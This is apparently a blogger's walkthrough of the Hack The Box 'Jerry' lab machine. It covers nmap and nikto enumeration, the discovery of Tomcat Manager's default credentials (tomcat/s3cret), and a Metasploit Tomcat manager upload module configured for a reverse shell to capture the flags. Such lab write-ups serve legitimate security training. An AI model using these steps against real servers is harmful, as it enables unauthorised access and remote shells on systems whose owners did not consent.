Jerry is fourth challenge and second vulnerable box in the Beginner Track on Hack The Box. The challenge involves using metasploit to execute an exploit that takes advantage of the fact that the Windows installer for *Apache Tomcat* used default login credentials in earlier versions.

[CVE-2009-3548](https://nvd.nist.gov/vuln/detail/CVE-2009-3548)

<ins> **Enumeration** </ins>


My first step with any vulnerable machine is to enumerate for service versions using nmap. 

`Nmap –sV –sC –O <target_IP> >> nmap.txt && cat nmap.txt `

This command tells *nmap* to scan the target IP for service versions and to test any default scripts it may be vulnerable to, along with attempting to identify the OS. It then outputs the results into a file called *nmap.txt* and then displays the contents of the file on screen using *cat*.

The machine is hosting an *Apache Tomcat/Coyote JSP engine 1.1 webserver* on *port 8080*. The OS scan couldn't say for sure but the machine is likely running on Windows.

<ins> **What Didn't Work** </ins>

I had a good lesson here in not limitting myself to the first results of my enumeration, or at the very least my first takeaway from the results.

I used *searchsploit* to look for the version of *apache tomcat* I thought the machine was using based on the *nmap* scan results. This yielded 2 results, one of which was a python script. Since I know a little bit of python I decided to start here.

![searchsploit](/docs/assets/images/HTB/jerry/jerry02.png)

Using `locate` to search for the file path listed on *searchsploit* I was able to easily find this script already stored on my system..

![locate](/docs/assets/images/HTB/jerry/jerry03.png)

Most python scripts utilize the `-h` or `--help` switch to display a menu that usually provides syntax for it's usage. 

![Script help](/docs/assets/images/HTB/jerry/jerry04.png)

The script is fairly simple to use it just requires the `-u` switch and *target IP*. Unfortunately this Webserver isn't actually vulnerable to this exploit.

![Script nope](/docs/assets/images/HTB/jerry/jerry05.png)

My guess is the machine isn't actually running on version 7.0.88 of *apache tomcat*.

<ins> **More Enumeration** </ins>

If at first you don't succeed enumerate some more.

One tool I like to use when enumerating a webserver is *nikto*

Taken from it's [repository](https://github.com/sullo/nikto/wiki/Overview-&-Description)

> Nikto is an Open Source (GPL) web server scanner which performs comprehensive tests against web servers for multiple items, including over 6700 potentially dangerous files/programs, checks for outdated versions of over 1250 servers, and version specific problems on over 270 servers. It also checks for server configuration items such as the presence of multiple index files, HTTP server options, and will attempt to identify installed web servers and software. Scan items and plugins are frequently updated and can be automatically updated. 

*nikto* comes preinstalled on kali but a direct link to the [repository](https://github.com/sullo/nikto) is always handy.

The usage is pretty simple `nikto -h <target_ip>` does the trick. The -h switch tells nikto that the next line in the arguement will be the ip address to scan.

![nikto](/docs/assets/images/HTB/jerry/jerry06.png)

> + Allowed HTTP Methods: GET, HEAD, POST, PUT, DELETE, OPTIONS  
>
> + OSVDB-397: HTTP method ('Allow' Header): 'PUT' method could allow clients to save files on the web server. 
>
> + OSVDB-5646: HTTP method ('Allow' Header): 'DELETE' may allow clients to remove files on the web server. 
>
> + Default account found for 'Tomcat Manager Application' at /manager/html (ID 'tomcat', PW 's3cret'). Apache Tomcat. 
>

>
> + /manager/html: Tomcat Manager / Host Manager interface found (pass protected) 
>
> + /manager/status: Tomcat Server Status interface found (pass protected) 

Some key takeaways from this scan. 

The webserver accepts all basic forms of http requests and clients are likely able to save and remove files from the webserver. In addition to that it runs something called *Tomcat Manger Application* with default credentials listed as *user ID: tomcat* and *password: s3cret* 

earlier I told *searchsploit* to list vulnerablities related to *apache tomcat 7.0.88* which would have missed any results related to *tomcat manager* which there were.

![searchsploit2](/docs/assets/images/HTB/jerry/jerry07.png)

There are 3 exploits related to tomcat manager, one of which is related to uploading which thanks to *nikto* I know I'm able to do.

<ins> *Metasploit* </ins> 

In the `msfconsole` I enter `search tomcat manager` to up a list of exploits related to it, there are several but the one I found on *searchsploit* that i'm looking for match *2* on my console so I enter `use 2`

![msfconsole](/docs/assets/images/HTB/jerry/jerry08.png)

Once the module loads up I enter `show options` to see what configurations the exploit needs to run and then set the appropriate ones.

![msfconsole options](/docs/assets/images/HTB/jerry/jerry09.png)

```
set HttpPassword s3cret

set HttpUsername tomcat

set RHOST 10.10.10.95

set RPORT 8080

set LHOST 10.10.14.2

set LPORT 4444
```

After changing configurations I always `show options` again just to verify everything is how I want it.

![options2](/docs/assets/images/HTB/jerry/jerry10.png)

I then set up a listner to catch the shell the payload generated but that wasn't necessary and actually caused an error the first time I ran the exploit.

![exploit](/docs/assets/images/HTB/jerry/jerry11.png)

Enter *shell* in the *meterpreter* grants access to the *command line* From there it was as simple as using various windows commands to navigate through the file system and find the flags. Even though *nmap* told me it was a Windows server earlier I still caught myself using Linux commands several times out of habbit.

![navigate1](/docs/assets/images/HTB/jerry/jerry12.png)

![navigate2](/docs/assets/images/HTB/jerry/jerry13.png)

![navigate3](/docs/assets/images/HTB/jerry/jerry14.png)

The flags are found on the *adminstrator* users *desktop* in a directory called *flags* that contains a single file *"2 for the price of 1.txt"*. Since this is a windows machine the *type* command is what is used to read the file.

![flags](/docs/assets/images/HTB/jerry/jerry15.png)

All that's left to do is submit them on Hack The Box.

<ins> **Final Thoughts** </ins>

Another machine in the beginner track defeated with *metasploit*. I was hoping that the *python* script for the first exploit would work out so I didn't have to use *metasploit* again but here we are.  There is probably more than one way to break into this machine as *tomcat manager* had a *XSS* exploit associated with it as well as several other exploits on *metasploit* so perhaps it will be worth revisiting someday.
